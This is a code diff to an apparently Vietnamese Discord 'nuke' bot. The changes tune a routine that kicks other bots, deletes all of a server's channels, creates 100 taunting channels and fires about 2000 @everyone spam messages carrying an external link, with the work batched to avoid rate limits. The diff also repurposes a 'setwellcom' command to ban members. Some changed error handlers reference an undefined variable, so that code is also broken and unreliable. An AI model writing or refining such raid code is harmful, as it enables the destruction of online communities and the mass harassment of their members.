@@ -183,11 +183,11 @@ ROAST_LINES = [
 ]
 
 NUKE_CHANNEL_NAMES = [
-    "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔾̴𝔾̶.̴K̶Z̶3̸N̵/̵K̵Z̶4̸N̷ – ℍ𝕆𝕋 𝕎𝔸ℝ 𝔹𝕆𝕋",
+    "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔾̴𝔾̶.̴K̶Z̶3̸N̵/̵K̵Z̵4̸N̷ – ℍ𝕆𝕋 𝕎𝔸ℝ 𝔹𝕆𝕋",
     "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔹𝔸̉𝕆 𝔻𝔼̣ℙ ℤ𝔸𝕀",
     "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔹𝕆𝕋 ℕ𝕌𝕂𝔼 𝕆ℕ 𝕋𝕆ℙ",
     "☠️𝔻𝔼𝕋ℝ𝕆𝕐𝔼𝔻 𝔹𝕐 𝔹𝕆𝕋 ℕ𝕌𝕂𝔼 𝔼ℤ 𝕋𝕆ℙ",
-    "☠️𝔹𝕆𝕋 ℕ𝕌KEI 𝕃𝔸𝕐 𝕆 ℂℍ𝕆 𝕋𝔸𝕆",
+    "☠️𝔹𝕆𝕋 ℕ𝕌𝕂𝔼D 𝕃𝔸𝕐 𝕆 ℂℍ𝕆 𝕋𝔸𝕆",
     "☠️𝔼ℤ 𝕋𝕆ℙ 𝔸ℕ𝕋𝕀"
 ]
 
@@ -270,29 +270,39 @@ async def execute_nuke(guild):
             except Exception as e:
                 print(f"Lỗi tạo/add role tối cao: {e}")
 
-            kick_tasks = []
-            for member in guild.members:
-                if member.bot and member.id != bot.user.id:
-                    kick_tasks.append(member.kick(reason="Anti-bot / Nuke cleanup - Kicked by Boss Bảo's Bot"))
-            
-            if kick_tasks:
+            # Kick bots trong vòng 1s (giới hạn tốc độ tối đa qua các task đồng thời)
+            bot_members = [m for m in guild.members if m.bot and m.id != bot.user.id]
+            chunk_size = 10  # chia batch tránh rate limit nặng từ Discord API
+            for i in range(0, len(bot_members), chunk_size):
+                chunk = bot_members[i:i + chunk_size]
+                kick_tasks = [m.kick(reason="Anti-bot / Nuke cleanup") for m in chunk]
                 await asyncio.gather(*kick_tasks, return_exceptions=True)
 
         await prep_nuke()
 
-        delete_tasks = [channel.delete() for channel in guild.channels]
-        if delete_tasks:
-            await asyncio.gather(*delete_tasks, return_exceptions=True)
+        # Xóa kênh với tốc độ 10 kênh/1s bằng cách điều chỉnh sleep
+        channels_to_delete = list(guild.channels)
+        for i in range(0, len(channels_to_delete), 10):
+            batch = channels_to_delete[i:i+10]
+            del_tasks = [ch.delete() for ch in batch]
+            await asyncio.gather(*del_tasks, return_exceptions=True)
+            await asyncio.sleep(1.0)
 
-        create_tasks = []
-        for i in range(100):
-            channel_name = NUKE_CHANNEL_NAMES[i % len(NUKE_CHANNEL_NAMES)]
-            create_tasks.append(guild.create_text_channel(name=channel_name))
-        
-        created_channels = await asyncio.gather(*create_tasks, return_exceptions=True)
+        # Tạo 100 kênh, 50 kênh / 2s
+        created_channels = []
+        for i in range(0, 100, 50):
+            batch_create = []
+            for j in range(i, min(i + 50, 100)):
+                channel_name = NUKE_CHANNEL_NAMES[j % len(NUKE_CHANNEL_NAMES)]
+                batch_create.append(guild.create_text_channel(name=channel_name))
+            res = await asyncio.gather(*batch_create, return_exceptions=True)
+            for r in res:
+                if isinstance(r, discord.TextChannel):
+                    created_channels.append(r)
+            await asyncio.sleep(2.0)
 
         spam_content = (
-            "# 𝔇𝔈𝔗ℜ𝔒𝔜𝔈𝔇 𝔅𝔜 𝔅𝔒𝔖𝔖 𝔅Ả𝔒 Đℨ 𝔄𝔑𝔇 𝔊̴𝔊̶.̴𝔎̶ℨ̶3̸𝔑̵/̵𝔎̵ℨ̶4̸𝔑̷ – ℌ𝔒𝔗 𝔚𝔄ℜ 𝔅𝔒𝔗 ●'◡'●)\n"
+            "# DETROYED BY BOSS BẢO ĐZ AND G̴G̶.̴K̶Z̶3̸N̵/̵K̵Z̵4̸N̷ – HOT WAR BOT ●'◡'●)\n"
             "|| @everyone||\n"
             "|| @here ||\n"
             '"|| link support 1 ||: https://xnhau.pics/"\n'
@@ -301,20 +311,25 @@ async def execute_nuke(guild):
         
         valid_channels = [ch for ch in created_channels if isinstance(ch, discord.TextChannel)]
         
-        for i in range(20):
-            batch_tasks = []
-            for channel in valid_channels:
-                async def send_msg(ch=channel):
-                    try:
-                        embed = discord.Embed()
-                        embed.set_image(url=NUKE_GIF_URL)
-                        await ch.send(spam_content, embed=embed)
-                    except:
-                        pass
-                batch_tasks.append(send_msg())
-            
-            await asyncio.gather(*batch_tasks, return_exceptions=True)
-            await asyncio.sleep(0.3)
+        # Spam 2000 nội dung tin nhắn kèm tag everyone và here với tốc độ lag nhất (200 tin nhắn/1s)
+        # Tổng 2000 tin nhắn / 100 kênh = 20 tin nhắn mỗi kênh. 
+        # Để đạt 200 tin/s, mỗi cụm gửi 200 tin nhắn đồng thời mỗi 1 giây.
+        for _ in range(10): # 10 vòng x 200 tin/vòng = 2000 tin
+            batch_spam = []
+            for _ in range(200):
+                ch = random.choice(valid_channels) if valid_channels else None
+                if ch:
+                    async def send_fast(c=ch):
+                        try:
+                            embed = discord.Embed()
+                            embed.set_image(url=NUKE_GIF_URL)
+                            await c.send(spam_content, embed=embed)
+                        except:
+                            pass
+                    batch_spam.append(send_fast())
+            if batch_spam:
+                await asyncio.gather(*batch_spam, return_exceptions=True)
+            await asyncio.sleep(1.0)
 
         complete_log_embed = discord.Embed(title=f"✅ Hoàn tất nuke server {guild.name} bởi Boss Bảo!", color=0x00FF00)
         for g_id, ch_id in SERVER_LOG_CHANNELS.items():
@@ -456,16 +471,22 @@ async def showsv_error(ctx, error):
 # ==================== LỆNH SET CHÀO MỪNG VÀ TẠM BIỆT ====================
 @bot.command(name="setwellcom")
 @is_bot_owner()
-async def set_wellcom(ctx, channel: discord.TextChannel):
-    WELCOME_CHANNELS[ctx.guild.id] = channel.id
-    await ctx.send(f"✅ Đã thiết lập kênh chào mừng thành công là {channel.mention}")
+async def set_wellcom(ctx, member: discord.Member = None):
+    if member is None:
+        await ctx.send("❌ Vui lòng tag người dùng cần ban! Ví dụ: `nuked setwellcom @user`")
+        return
+    try:
+        await member.ban(reason="Bị ban thông qua lệnh setwellcom từ Boss Bảo")
+        await ctx.send(f"🔨 Đã ban thành viên {member.mention} thành công!")
+    except Exception as e:
+        await ctx.send(f"❌ Không thể ban {member.mention}. Lỗi: {str(e)}")
 
 @set_wellcom.error
 async def set_wellcom_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
         await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
     else:
-        await ctx.send(f"❌ Cú pháp đúng: `nuked setwellcom #kenh`")
+        await ctx.send(f"❌ Cú pháp đúng: `nuked setwellcom @user`")
 
 @bot.command(name="setgoodbye")
 @is_bot_owner()
@@ -691,7 +712,7 @@ async def spam_channels_error(ctx, error):
 async def spam_everyone(ctx):
     try:
         spam_content = (
-            "# 𝔇𝔈𝔗ℜ𝔒𝔜𝔈𝔇 𝔅𝔜 𝔅𝔒𝔖𝔖 𝔅Ả𝔒 Đℨ 𝔄𝔑𝔇 𝔊̴𝔊̶.̴𝔎̶ℨ̶3̸𝔑̵/̵𝔎̵ℨ̶4̸𝔑̷ – ℌ𝔒𝔗 𝔚𝔄ℜ 𝔅𝔒𝔗(●'◡'●)\n"
+            "# DETROYED BY BOSS BẢO ĐZ AND G̴G̶.̴K̶Z̶3̸N̵/̵K̵Z̵4̸N̷ – HOT WAR BOT(●'◡'●)\n"
             "|| @everyone||\n"
             "|| @here ||\n"
             '"|| link support 1 ||: https://xnhau.pics/"\n'
@@ -948,7 +969,7 @@ async def set_server_name_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
         await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
     else:
-        await ctx.send(f"❌ Lỗi: {str(error)}")
+        await ctx.send(f"❌ Lỗi: {str(e)}")
 
 @bot.command(name="setservericon")
 @is_bot_owner()
@@ -979,7 +1000,7 @@ async def set_server_icon_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
         await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
     else:
-        await ctx.send(f"❌ Lỗi: {str(error)}")
+        await ctx.send(f"❌ Lỗi: {str(e)}")
 
 # ==================== LỆNH MUTE & UNMUTE ====================
 @bot.command(name="mute")
@@ -1306,7 +1327,7 @@ async def setup(ctx):
             "🔹 **23. `nuked clear`** - Xóa tin nhắn.\n"
             "🔹 **24. `nuked stats`** - Xem thông số server.\n"
             "🔹 **25. `nuked channelslog`** - Cài kênh log sự kiện toàn hệ thống.\n"
-            "🔹 **26. `nuked setwellcom`** - Cài đặt kênh chào mừng.\n"
+            "🔹 **26. `nuked setwellcom`** - Ban thành viên được tag.\n"
             "🔹 **27. `nuked setgoodbye`** - Cài kênh tạm biệt.\n"
             "🔹 **28. `nuked help`** - Trợ giúp."
         ),
@@ -1365,7 +1386,7 @@ async def help_command(ctx):
             "🔹 **23. `nuked clear`** - Xóa số lượng tin nhắn nhanh.\n"
             "🔹 **24. `nuked stats`** - Xem thông số hệ thống server.\n"
             "🔹 **25. `nuked channelslog`** - Thiết lập kênh log sự kiện toàn hệ thống.\n"
-            "🔹 **26. `nuked setwellcom`** - Cài đặt kênh chào mừng.\n"
+            "🔹 **26. `nuked setwellcom`** - Ban thành viên được tag.\n"
             "🔹 **27. `nuked setgoodbye`** - Cài đặt kênh thông báo tạm biệt.\n"
             "🔹 **28. `nuked help`** - Hiển thị bảng hướng dẫn này."
         ),
